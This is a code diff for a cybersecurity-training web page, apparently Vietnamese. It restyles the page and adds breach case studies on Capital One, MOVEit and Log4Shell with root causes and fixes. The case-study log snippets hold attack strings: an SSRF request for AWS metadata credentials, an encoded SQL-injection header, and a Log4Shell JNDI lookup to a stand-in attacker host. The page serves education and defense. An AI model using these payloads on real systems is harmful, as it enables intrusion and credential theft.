@@ -18,6 +18,7 @@ import {
   RotateCcw,
   Play,
   Crosshair,
+  FileText,
 } from "lucide-react"
 import { Badge, Button, CountUp } from "../../components/common"
 import { CourseSyllabusDrawer } from "./components/CourseSyllabusDrawer"
@@ -32,6 +33,43 @@ const CATEGORIES = [
   { id: "network", label: "Network Forensics", count: 1 },
   { id: "cloud", label: "Cloud & Kubernetes", count: 1 },
   { id: "reverse", label: "Binary & Reverse Eng", count: 1 },
+]
+
+// Professional Real-World Incident Case Studies (Depth & Retention Engine)
+const REAL_WORLD_CASE_STUDIES = [
+  {
+    id: "cs-1",
+    tag: "Cloud / SSRF",
+    cve: "AWS-IMDS-SSRF",
+    victim: "Capital One Data Breach (106M Hồ Sơ Bị Rò Rỉ)",
+    attackVector: "Server-Side Request Forgery qua ModSecurity WAF reverse proxy",
+    impact: "Khai thác địa chỉ Link-Local 169.254.169.254 để trích xuất IAM Role keys tạm thời, sau đó tải về hơn 700 S3 buckets.",
+    rootCause: "Reverse proxy cho phép forward các request tùy ý từ người dùng tới internal metadata service mà không có token bắt buộc.",
+    remediation: "Bắt buộc nâng cấp lên AWS IMDSv2 (yêu cầu session token qua HTTP PUT) và thiết lập network hop-limit = 1.",
+    logSnippet: "GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/waf-role HTTP/1.1",
+  },
+  {
+    id: "cs-2",
+    tag: "SQLi / Zero-Day",
+    cve: "CVE-2023-34362",
+    victim: "MOVEit Transfer Enterprise Zero-Day Campaign",
+    attackVector: "SQL Injection qua HTTP Request Header trong REST API",
+    impact: "Chiến dịch tống tiền Cl0p Ransomware đánh cắp dữ liệu của hơn 2,000 tổ chức tài chính & chính phủ toàn cầu.",
+    rootCause: "Ứng dụng giải mã header X-siLock-SessionInfo mà không dùng tham số hóa, chèn trực tiếp chuỗi vào câu lệnh SQL.",
+    remediation: "Áp dụng Prepared Statements bắt buộc cho toàn bộ database driver và vô hiệu hóa endpoint guest API không xác thực.",
+    logSnippet: "Headers: X-siLock-SessionInfo: eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCBudWxsLC4uLiJ9",
+  },
+  {
+    id: "cs-3",
+    tag: "RCE / Supply Chain",
+    cve: "CVE-2021-44228",
+    victim: "Apache Log4j (Log4Shell Remote Code Execution)",
+    attackVector: "JNDI Lookup Injection trong User-Agent & HTTP Telemetry",
+    impact: "Thực thi mã từ xa (RCE) ngay lập tức trên hàng triệu ứng dụng Java doanh nghiệp.",
+    rootCause: "Thư viện Log4j mặc định phân giải biểu thức chuỗi dạng ${jndi:ldap://...} khi ghi log mà không kiểm tra độ tin cậy.",
+    remediation: "Nâng cấp Log4j 2.17.1+, bật cấu hình log4j2.formatMsgNoLookups=true, chặn triệt để egress LDAP/RMI tại firewall.",
+    logSnippet: "User-Agent: ${jndi:ldap://adversary-c2.internal/Exploit.class}",
+  },
 ]
 
 export function Learning() {
@@ -50,6 +88,7 @@ export function Learning() {
   const [searchQuery, setSearchQuery] = useState("")
   const [selectedDifficulty, setSelectedDifficulty] = useState("all")
   const [expandedSyllabus, setExpandedSyllabus] = useState({ "mod-web201": true })
+  const [activeCaseStudyIndex, setActiveCaseStudyIndex] = useState(0)
   
   // Interactive Daily Threat Drill State
   const [drillAnswer, setDrillAnswer] = useState(null)
@@ -102,12 +141,14 @@ export function Learning() {
     setDrillSubmitted(false)
   }
 
+  const currentCaseStudy = REAL_WORLD_CASE_STUDIES[activeCaseStudyIndex]
+
   return (
     <div className="space-y-10 pb-10 sm:pb-12 animate-fade-in-up">
       {/* ====================================================================
           1. ACADEMY MISSION CONTROL HUD (HERO BANNER - CYBER RANGE THEME)
          ==================================================================== */}
-      <section className="relative rounded-3xl bg-slate-900 border border-slate-800 shadow-2xl p-6 sm:p-8 overflow-hidden text-white">
+      <section className="relative rounded-3xl bg-gradient-to-br from-slate-900 via-slate-900 to-indigo-950/90 border border-slate-700/60 dark:border-slate-800 shadow-xl p-6 sm:p-8 overflow-hidden text-white">
         {/* Neon laser accent bar */}
         <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-indigo-500" />
         
@@ -135,33 +176,33 @@ export function Learning() {
               Giáo Trình Thực Chiến An Ninh Mạng & Phân Tích Khai Thác
             </h1>
 
-            <p className="text-slate-300 text-sm sm:text-base leading-relaxed">
+            <p className="text-slate-300 text-sm sm:text-base leading-relaxed font-sans">
               Mỗi bài học được thiết kế chuẩn thao trường (Cyber Range) với kịch bản mã độc thực tế, payload khai thác chi tiết, phân tích code và máy ảo sandbox tương tác độc lập.
             </p>
           </div>
 
           {/* Quick HUD Metrics Card */}
-          <div className="grid grid-cols-2 gap-3 p-4 rounded-2xl bg-slate-950/80 border border-slate-800 shadow-xl backdrop-blur-md shrink-0 min-w-[280px]">
-            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-800/80">
+          <div className="grid grid-cols-2 gap-3 p-4 rounded-2xl bg-slate-950/80 border border-slate-700/60 dark:border-slate-800 shadow-xl backdrop-blur-md shrink-0 min-w-[280px]">
+            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
               <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Active Learners</span>
               <span className="text-lg font-mono font-extrabold text-cyan-400">
                 <CountUp end={14820} duration={200} />
               </span>
             </div>
-            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-800/80">
+            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
               <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Labs Mapped</span>
               <span className="text-lg font-mono font-extrabold text-emerald-400">
                 <CountUp end={68} duration={200} suffix=" VMs" />
               </span>
             </div>
-            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-800/80">
+            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
               <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Total Academy XP</span>
               <span className="text-lg font-mono font-extrabold text-amber-400 flex items-center gap-1">
                 <Flame className="w-4 h-4 fill-amber-400 text-amber-400" />
                 <span>{userXp} XP</span>
               </span>
             </div>
-            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-800/80">
+            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
               <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Active Season</span>
               <span className="text-lg font-mono font-extrabold text-indigo-400">Tier-2 Range</span>
             </div>
@@ -170,7 +211,7 @@ export function Learning() {
       </section>
 
       {/* ====================================================================
-          2. FILTER & SEARCH CONTROL MATRIX
+          2. FILTER & SEARCH CONTROL MATRIX (Adaptive Light/Dark Harmony)
          ==================================================================== */}
       <div className="space-y-4">
         {/* Category Pill Filters */}
@@ -181,16 +222,16 @@ export function Learning() {
               onClick={() => setActiveCategory(cat.id)}
               className={`px-4 py-2 rounded-xl text-xs font-semibold whitespace-nowrap transition-all duration-200 cursor-pointer flex items-center gap-2 ${
                 activeCategory === cat.id
-                  ? "bg-cyan-500 text-slate-950 font-bold shadow-md shadow-cyan-500/20"
-                  : "bg-slate-900/70 hover:bg-slate-800 text-slate-300 border border-slate-800"
+                  ? "bg-blue-600 dark:bg-cyan-500 text-white dark:text-slate-950 font-bold shadow-md shadow-blue-500/20 dark:shadow-cyan-500/20"
+                  : "bg-white dark:bg-slate-900/70 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-800 shadow-2xs"
               }`}
             >
               <span>{cat.label}</span>
               <span
                 className={`text-[10px] px-1.5 py-0.2 rounded-full font-mono ${
                   activeCategory === cat.id
-                    ? "bg-slate-950/30 text-slate-950 font-bold"
-                    : "bg-slate-800 text-slate-400"
+                    ? "bg-white/20 dark:bg-slate-950/30 text-white dark:text-slate-950 font-bold"
+                    : "bg-slate-100 dark:bg-slate-800 text-slate-500 dark:text-slate-400"
                 }`}
               >
                 {cat.count}
@@ -208,20 +249,20 @@ export function Learning() {
               value={searchQuery}
               onChange={(e) => setSearchQuery(e.target.value)}
               placeholder="Tìm mã module (e.g. WEB-201), CVE, OWASP hoặc chứng chỉ..."
-              className="w-full pl-10 pr-4 py-2.5 rounded-xl text-xs sm:text-sm bg-slate-900/80 border border-slate-800 text-white focus:outline-none focus:ring-2 focus:ring-cyan-500/30 focus:border-cyan-500 placeholder:text-slate-500 transition-all shadow-inner"
+              className="w-full pl-10 pr-4 py-2.5 rounded-xl text-xs sm:text-sm bg-white dark:bg-slate-900/80 border border-slate-200 dark:border-slate-800 text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500/30 dark:focus:ring-cyan-500/30 focus:border-blue-500 dark:focus:border-cyan-500 placeholder:text-slate-400 dark:placeholder:text-slate-500 transition-all shadow-xs"
             />
           </div>
 
           <div className="flex items-center gap-2 shrink-0">
-            <span className="text-xs text-slate-400 font-mono hidden sm:inline">ĐỘ KHÓ:</span>
+            <span className="text-xs text-slate-500 dark:text-slate-400 font-mono hidden sm:inline">ĐỘ KHÓ:</span>
             {["all", "novice", "intermediate", "specialist"].map((diff) => (
               <button
                 key={diff}
                 onClick={() => setSelectedDifficulty(diff)}
                 className={`px-3 py-1.5 rounded-lg text-xs font-mono uppercase font-semibold transition-all cursor-pointer ${
                   selectedDifficulty === diff
-                    ? "bg-slate-100 text-slate-950 shadow-sm"
-                    : "bg-slate-900/70 text-slate-400 hover:bg-slate-800 border border-slate-800"
+                    ? "bg-slate-900 dark:bg-slate-100 text-white dark:text-slate-950 shadow-sm font-bold"
+                    : "bg-white dark:bg-slate-900/70 text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200 dark:border-slate-800 shadow-2xs"
                 }`}
               >
                 {diff}
@@ -238,19 +279,19 @@ export function Learning() {
         {/* LEFT COLUMN: MODULE CARDS WITH EXPANDABLE SYLLABUS (8 COLS) */}
         <div className="lg:col-span-8 space-y-6">
           <div className="flex items-center justify-between">
-            <h2 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-400 flex items-center gap-2">
-              <Crosshair className="w-4 h-4 text-cyan-400" />
+            <h2 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-500 dark:text-slate-400 flex items-center gap-2">
+              <Crosshair className="w-4 h-4 text-blue-600 dark:text-cyan-400" />
               <span>GIÁO TRÌNH TÁC CHIẾN ({filteredModules.length} MODULES)</span>
             </h2>
-            <span className="text-[11px] text-cyan-400 font-mono">
+            <span className="text-[11px] text-blue-600 dark:text-cyan-400 font-mono font-semibold">
               BẤM VÀO BÀI HỌC ĐỂ MỞ MISSION CONSOLE
             </span>
           </div>
 
           {filteredModules.length === 0 ? (
-            <div className="p-12 text-center bg-slate-900 rounded-3xl border border-slate-800 space-y-3">
-              <HelpCircle className="h-10 w-10 text-slate-500 mx-auto" />
-              <p className="text-sm font-medium text-slate-300">Không tìm thấy module phù hợp với bộ lọc hiện tại.</p>
+            <div className="p-12 text-center bg-white dark:bg-slate-900 rounded-3xl border border-slate-200 dark:border-slate-800 space-y-3 shadow-sm">
+              <HelpCircle className="h-10 w-10 text-slate-400 dark:text-slate-500 mx-auto" />
+              <p className="text-sm font-medium text-slate-700 dark:text-slate-300">Không tìm thấy module phù hợp với bộ lọc hiện tại.</p>
               <Button
                 variant="outline"
                 size="sm"
@@ -273,18 +314,18 @@ export function Learning() {
               return (
                 <div
                   key={mod.id}
-                  className="p-5 sm:p-6 rounded-3xl bg-slate-900/90 border border-slate-800/90 hover:border-cyan-500/40 shadow-xl transition-all duration-300 relative overflow-hidden group space-y-4"
+                  className="p-5 sm:p-6 rounded-3xl bg-white dark:bg-slate-900/90 border border-slate-200 dark:border-slate-800/90 hover:border-blue-400 dark:hover:border-cyan-500/40 shadow-sm hover:shadow-md dark:shadow-xl transition-all duration-300 relative overflow-hidden group space-y-4"
                 >
                   {/* Subtle top indicator for enrolled courses */}
                   {isEnrolled && (
-                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-emerald-500" />
+                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-blue-600 via-cyan-500 to-emerald-500" />
                   )}
 
                   <div className="space-y-4">
                     {/* Header Row: Code + Track + Difficulty + CVSS */}
                     <div className="flex flex-wrap items-center justify-between gap-2.5">
                       <div className="flex items-center gap-2 flex-wrap">
-                        <span className="px-2.5 py-0.5 rounded font-mono text-xs font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
+                        <span className="px-2.5 py-0.5 rounded font-mono text-xs font-bold bg-blue-50 dark:bg-cyan-500/10 text-blue-700 dark:text-cyan-400 border border-blue-200 dark:border-cyan-500/30">
                           {mod.code}
                         </span>
 
@@ -301,27 +342,27 @@ export function Learning() {
                           {mod.difficulty}
                         </Badge>
 
-                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">
+                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700">
                           {mod.cert}
                         </span>
 
-                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-800/80 text-amber-300 border border-amber-900/30 hidden sm:inline-block">
+                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800/80 text-amber-700 dark:text-amber-300 border border-amber-200 dark:border-amber-900/30 hidden sm:inline-block">
                           MITRE: {mod.mitre}
                         </span>
 
-                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-rose-950/40 text-rose-300 border border-rose-800/40">
+                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-rose-50 dark:bg-rose-950/40 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-800/40">
                           CVSS {mod.cvssBase}
                         </span>
                       </div>
 
-                      <div className="flex items-center gap-3 text-xs font-mono text-slate-400">
-                        <span className="flex items-center gap-1 text-cyan-400">
+                      <div className="flex items-center gap-3 text-xs font-mono text-slate-500 dark:text-slate-400">
+                        <span className="flex items-center gap-1 text-blue-600 dark:text-cyan-400 font-semibold">
                           <Clock className="h-3.5 w-3.5" />
                           {mod.duration}
                         </span>
                         <span className="flex items-center gap-1 hidden sm:flex">
-                          <Layers className="h-3.5 w-3.5 text-slate-500" />
-                          {mod.lessonsCount} Lessons
+                          <Layers className="h-3.5 w-3.5 text-slate-400" />
+                          {mod.lessonsCount} Bài giảng
                         </span>
                       </div>
                     </div>
@@ -330,25 +371,25 @@ export function Learning() {
                     <div className="space-y-1.5">
                       <h3
                         onClick={() => openLessonModal(mod.id)}
-                        className="text-base sm:text-lg font-bold text-white group-hover:text-cyan-400 transition-colors cursor-pointer"
+                        className="text-base sm:text-lg font-bold text-slate-900 dark:text-white group-hover:text-blue-600 dark:group-hover:text-cyan-400 transition-colors cursor-pointer"
                       >
                         {mod.title}
                       </h3>
-                      <p className="text-xs sm:text-sm text-slate-300 leading-relaxed font-sans">
+                      <p className="text-xs sm:text-sm text-slate-600 dark:text-slate-300 leading-relaxed font-sans">
                         {mod.description}
                       </p>
                     </div>
 
                     {/* Progress Bar (Dynamic from Store) */}
                     {isEnrolled && (
-                      <div className="rounded-2xl bg-slate-950 p-3.5 border border-slate-800/90 space-y-1.5">
+                      <div className="rounded-2xl bg-slate-50 dark:bg-slate-950 p-3.5 border border-slate-200 dark:border-slate-800/90 space-y-1.5">
                         <div className="flex justify-between items-center text-xs font-semibold">
-                          <span className="text-slate-300 font-mono">TIẾN ĐỘ HOÀN THÀNH</span>
-                          <span className="text-cyan-400 font-mono">{progress}% ({completedList.length}/{mod.syllabus.length} bài)</span>
+                          <span className="text-slate-700 dark:text-slate-300 font-mono">TIẾN ĐỘ HOÀN THÀNH</span>
+                          <span className="text-blue-600 dark:text-cyan-400 font-mono">{progress}% ({completedList.length}/{mod.syllabus.length} bài)</span>
                         </div>
-                        <div className="w-full h-2 rounded-full bg-slate-800 overflow-hidden">
+                        <div className="w-full h-2 rounded-full bg-slate-200 dark:bg-slate-800 overflow-hidden">
                           <div
-                            className="h-full bg-gradient-to-r from-cyan-500 via-blue-500 to-emerald-500 rounded-full transition-all duration-500"
+                            className="h-full bg-gradient-to-r from-blue-600 via-cyan-500 to-emerald-500 rounded-full transition-all duration-500"
                             style={{ width: `${progress}%` }}
                           />
                         </div>
@@ -356,10 +397,10 @@ export function Learning() {
                     )}
 
                     {/* Action Bar & Accordion Trigger */}
-                    <div className="pt-2 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-t border-slate-800">
+                    <div className="pt-2 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-t border-slate-100 dark:border-slate-800">
                       <button
                         onClick={() => toggleSyllabus(mod.id)}
-                        className="inline-flex items-center gap-1.5 text-xs font-semibold text-cyan-400 hover:text-cyan-300 transition-colors cursor-pointer self-start sm:self-auto font-mono"
+                        className="inline-flex items-center gap-1.5 text-xs font-semibold text-blue-600 dark:text-cyan-400 hover:text-blue-700 dark:hover:text-cyan-300 transition-colors cursor-pointer self-start sm:self-auto font-mono"
                       >
                         {isExpanded ? (
                           <>
@@ -377,14 +418,14 @@ export function Learning() {
                       <div className="flex items-center gap-2.5">
                         <button
                           onClick={() => setDrawerCourse(mod)}
-                          className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono text-xs transition-colors cursor-pointer border border-slate-700"
+                          className="px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 font-mono text-xs transition-colors cursor-pointer border border-slate-200 dark:border-slate-700"
                         >
                           Syllabus Drawer
                         </button>
 
                         <button
                           onClick={() => launchLessonLab(mod.labId)}
-                          className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-cyan-400 font-mono text-xs flex items-center gap-1.5 transition-colors cursor-pointer border border-cyan-500/30"
+                          className="px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-blue-600 dark:text-cyan-400 font-mono text-xs flex items-center gap-1.5 transition-colors cursor-pointer border border-blue-200 dark:border-cyan-500/30"
                         >
                           <Terminal className="h-3.5 w-3.5" />
                           <span>Sandbox Lab</span>
@@ -392,9 +433,9 @@ export function Learning() {
 
                         <button
                           onClick={() => openLessonModal(mod.id)}
-                          className="px-4 py-1.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-xs flex items-center gap-1.5 shadow-md shadow-cyan-500/20 transition-all cursor-pointer"
+                          className="px-4 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 dark:bg-cyan-500 dark:hover:bg-cyan-400 text-white dark:text-slate-950 font-bold text-xs flex items-center gap-1.5 shadow-md shadow-blue-500/20 dark:shadow-cyan-500/20 transition-all cursor-pointer"
                         >
-                          <Play className="h-3.5 w-3.5 fill-slate-950" />
+                          <Play className="h-3.5 w-3.5 fill-current" />
                           <span>
                             {progress === 100
                               ? "Ôn Tập Khóa"
@@ -406,12 +447,12 @@ export function Learning() {
                       </div>
                     </div>
 
-                    {/* Expandable Syllabus Accordion (with Clickable Lessons!) */}
+                    {/* Expandable Syllabus Accordion */}
                     {isExpanded && (
-                      <div className="mt-3 pt-3 border-t border-slate-800 space-y-2 animate-fade-in-up">
-                        <div className="flex items-center justify-between text-[11px] font-mono text-slate-400 uppercase tracking-wider">
+                      <div className="mt-3 pt-3 border-t border-slate-100 dark:border-slate-800 space-y-2 animate-fade-in-up">
+                        <div className="flex items-center justify-between text-[11px] font-mono text-slate-500 dark:text-slate-400 uppercase tracking-wider">
                           <span>DANH SÁCH BÀI GIẢNG & PHÂN TÍCH THỰC CHIẾN</span>
-                          <span className="text-cyan-400">Click để mở bài học</span>
+                          <span className="text-blue-600 dark:text-cyan-400 font-semibold">Click để mở bài học</span>
                         </div>
 
                         <div className="space-y-1.5">
@@ -423,11 +464,11 @@ export function Learning() {
                                 key={lesson.id}
                                 className={`p-3 rounded-xl flex items-center justify-between text-xs transition-all group ${
                                   isLessonDone
-                                    ? "bg-emerald-950/20 border border-emerald-500/30 text-slate-200"
-                                    : "bg-slate-950/60 hover:bg-slate-800/80 border border-slate-800 hover:border-cyan-500/40 text-slate-200"
+                                    ? "bg-emerald-50/80 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-500/30 text-slate-800 dark:text-slate-200"
+                                    : "bg-slate-50/70 hover:bg-slate-100/90 dark:bg-slate-950/60 dark:hover:bg-slate-800/80 border border-slate-200 dark:border-slate-800 hover:border-blue-400 dark:hover:border-cyan-500/40 text-slate-800 dark:text-slate-200"
                                 }`}
                               >
-                                {/* Left: Toggle Checkbox + Title */}
+                                {/* Left: Checkbox + Title */}
                                 <div className="flex items-center gap-3 flex-1 min-w-0">
                                   <button
                                     onClick={(e) => {
@@ -436,8 +477,8 @@ export function Learning() {
                                     }}
                                     className={`w-4 h-4 rounded-full flex items-center justify-center shrink-0 transition-colors cursor-pointer ${
                                       isLessonDone
-                                        ? "bg-emerald-500 text-slate-950"
-                                        : "border border-slate-600 hover:border-cyan-400 text-transparent hover:text-cyan-400"
+                                        ? "bg-emerald-500 text-white"
+                                        : "border border-slate-300 dark:border-slate-600 hover:border-blue-500 dark:hover:border-cyan-400 text-transparent hover:text-blue-500"
                                     }`}
                                     title={isLessonDone ? "Đánh dấu chưa học" : "Đánh dấu đã hoàn thành"}
                                   >
@@ -449,10 +490,10 @@ export function Learning() {
                                     className="cursor-pointer flex-1 min-w-0"
                                   >
                                     <div className="flex items-center gap-2">
-                                      <span className="font-mono text-[10px] text-cyan-400/80 font-bold">
+                                      <span className="font-mono text-[10px] text-blue-600 dark:text-cyan-400 font-bold">
                                         Bài {String(idx + 1).padStart(2, "0")}
                                       </span>
-                                      <span className={`font-medium truncate ${isLessonDone ? "line-through text-slate-400" : "group-hover:text-cyan-400"}`}>
+                                      <span className={`font-medium truncate ${isLessonDone ? "line-through text-slate-400 dark:text-slate-500" : "group-hover:text-blue-600 dark:group-hover:text-cyan-400"}`}>
                                         {lesson.title}
                                       </span>
                                     </div>
@@ -464,7 +505,7 @@ export function Learning() {
                                   <span>{lesson.duration}</span>
                                   <button
                                     onClick={() => openLessonModal(mod.id, lesson.id)}
-                                    className="p-1 rounded text-slate-500 group-hover:text-cyan-400 transition-colors cursor-pointer"
+                                    className="p-1 rounded text-slate-400 hover:text-blue-600 dark:hover:text-cyan-400 transition-colors cursor-pointer"
                                     title="Mở Mission Console"
                                   >
                                     <ArrowRight className="h-3.5 w-3.5" />
@@ -481,6 +522,93 @@ export function Learning() {
               )
             })
           )}
+
+          {/* ====================================================================
+              DEPTH ENHANCEMENT: REAL-WORLD BREACH CASE STUDIES DOSSIER
+             ==================================================================== */}
+          <section className="p-6 rounded-3xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-md space-y-5 text-slate-900 dark:text-white">
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-100 dark:border-slate-800">
+              <div className="flex items-center gap-2.5">
+                <div className="p-2 rounded-xl bg-blue-50 dark:bg-blue-950/60 text-blue-600 dark:text-cyan-400 border border-blue-200 dark:border-blue-800/60">
+                  <FileText className="h-4 w-4" />
+                </div>
+                <div>
+                  <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
+                    <span>Hồ Sơ Sự Cố An Ninh Mạng Thực Chiến (Case Studies)</span>
+                  </h3>
+                  <p className="text-[11px] text-slate-500 dark:text-slate-400">
+                    Phân tích chi tiết nguyên nhân gốc rễ và cơ chế phòng thủ của các chiến dịch rò rỉ nổi tiếng
+                  </p>
+                </div>
+              </div>
+
+              {/* Case Study Selection Tabs */}
+              <div className="flex items-center gap-1.5 overflow-x-auto pb-1 scrollbar-none">
+                {REAL_WORLD_CASE_STUDIES.map((cs, idx) => (
+                  <button
+                    key={cs.id}
+                    type="button"
+                    onClick={() => setActiveCaseStudyIndex(idx)}
+                    className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold transition-all cursor-pointer whitespace-nowrap ${
+                      activeCaseStudyIndex === idx
+                        ? "bg-blue-600 dark:bg-cyan-500 text-white dark:text-slate-950 shadow-xs"
+                        : "bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700"
+                    }`}
+                  >
+                    {cs.tag}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {/* Active Case Study Detailed Card */}
+            <div className="space-y-4">
+              <div className="flex items-center justify-between flex-wrap gap-2">
+                <div className="flex items-center gap-2">
+                  <span className="font-mono text-xs font-bold px-2.5 py-0.5 rounded bg-rose-50 dark:bg-rose-950/50 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-800/40">
+                    {currentCaseStudy.cve}
+                  </span>
+                  <span className="font-bold text-sm text-slate-900 dark:text-white">
+                    {currentCaseStudy.victim}
+                  </span>
+                </div>
+                <span className="text-[11px] font-mono text-slate-400">
+                  Phân tích kỹ thuật chuyên sâu
+                </span>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5 text-xs">
+                <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 space-y-1">
+                  <span className="text-[10px] font-mono font-bold text-rose-600 dark:text-rose-400 uppercase block">
+                    Vector Tấn Công & Hậu Quả
+                  </span>
+                  <p className="font-semibold text-slate-800 dark:text-slate-200">
+                    {currentCaseStudy.attackVector}
+                  </p>
+                  <p className="text-slate-600 dark:text-slate-400 text-[11px] leading-relaxed">
+                    {currentCaseStudy.impact}
+                  </p>
+                </div>
+
+                <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 space-y-1">
+                  <span className="text-[10px] font-mono font-bold text-emerald-600 dark:text-emerald-400 uppercase block">
+                    Nguyên Nhân Gốc Rễ & Bản Vá Phòng Thủ
+                  </span>
+                  <p className="text-slate-700 dark:text-slate-300 text-[11px] leading-relaxed">
+                    <strong>Root Cause:</strong> {currentCaseStudy.rootCause}
+                  </p>
+                  <p className="text-slate-700 dark:text-slate-300 text-[11px] leading-relaxed pt-1">
+                    <strong>Giải pháp vá:</strong> {currentCaseStudy.remediation}
+                  </p>
+                </div>
+              </div>
+
+              {/* Log / Payload Telemetry Snippet */}
+              <div className="p-3 rounded-xl bg-slate-100 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 font-mono text-xs text-slate-800 dark:text-emerald-400 overflow-x-auto shadow-inner">
+                <code>{currentCaseStudy.logSnippet}</code>
+              </div>
+            </div>
+          </section>
         </div>
 
         {/* RIGHT COLUMN: INTERACTIVE DAILY THREAT DRILL & CERTIFICATION ROADMAP (4 COLS) */}
@@ -488,29 +616,29 @@ export function Learning() {
           {/* ====================================================================
               WIDGET 1: INTERACTIVE DAILY THREAT DRILL (GAMIFIED PROTOCOL CHALLENGE)
              ==================================================================== */}
-          <div className="p-5 rounded-3xl bg-slate-900 border border-cyan-500/30 shadow-xl relative overflow-hidden text-white space-y-3">
+          <div className="p-5 rounded-3xl bg-white dark:bg-slate-900 border border-blue-200 dark:border-cyan-500/30 shadow-md relative overflow-hidden text-slate-900 dark:text-white space-y-3">
             {/* Top Badge */}
             <div className="flex items-center justify-between gap-2">
-              <span className="font-mono text-[10px] font-bold px-2 py-0.5 rounded bg-cyan-500 text-slate-950 uppercase tracking-wider">
+              <span className="font-mono text-[10px] font-bold px-2 py-0.5 rounded bg-blue-600 dark:bg-cyan-500 text-white dark:text-slate-950 uppercase tracking-wider">
                 DAILY SOC THREAT DRILL
               </span>
-              <span className="text-[11px] font-mono text-amber-400 font-bold flex items-center gap-1">
+              <span className="text-[11px] font-mono text-amber-500 dark:text-amber-400 font-bold flex items-center gap-1">
                 <Flame className="h-3.5 w-3.5 fill-amber-400" />
                 +150 XP
               </span>
             </div>
 
-            <h3 className="text-sm font-bold text-white">
+            <h3 className="text-sm font-bold text-slate-900 dark:text-white">
               Phát Hiện Vector Tấn Công Trong HTTP Request Này
             </h3>
             
-            <p className="text-xs text-slate-400">
+            <p className="text-xs text-slate-500 dark:text-slate-400">
               Cụm WAF Reverse Proxy vừa chặn request bất thường gửi tới endpoint nội bộ:
             </p>
 
             {/* Code / Telemetry Log Snippet */}
-            <div className="rounded-xl bg-slate-950 p-3 font-mono text-[11px] text-slate-200 overflow-x-auto space-y-1 shadow-inner border border-slate-800">
-              <div className="text-emerald-400 font-bold">
+            <div className="rounded-xl bg-slate-100 dark:bg-slate-950 p-3 font-mono text-[11px] text-slate-800 dark:text-slate-200 overflow-x-auto space-y-1 shadow-inner border border-slate-200 dark:border-slate-800">
+              <div className="text-blue-700 dark:text-emerald-400 font-bold">
                 GET /api/v1/proxy?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1
               </div>
               <div className="text-slate-500">Host: app.enterprise-corp.internal</div>
@@ -535,14 +663,14 @@ export function Learning() {
                     className={`w-full text-left p-2.5 rounded-xl text-xs transition-all flex items-start gap-2.5 cursor-pointer border ${
                       drillSubmitted
                         ? opt.isCorrect
-                          ? "bg-emerald-950/40 border-emerald-500 text-emerald-200 font-semibold"
+                          ? "bg-emerald-50 dark:bg-emerald-950/40 border-emerald-500 text-emerald-800 dark:text-emerald-200 font-semibold"
                           : isSelected
-                          ? "bg-rose-950/40 border-rose-500 text-rose-200"
-                          : "bg-slate-950/40 border-slate-850 text-slate-500 opacity-60"
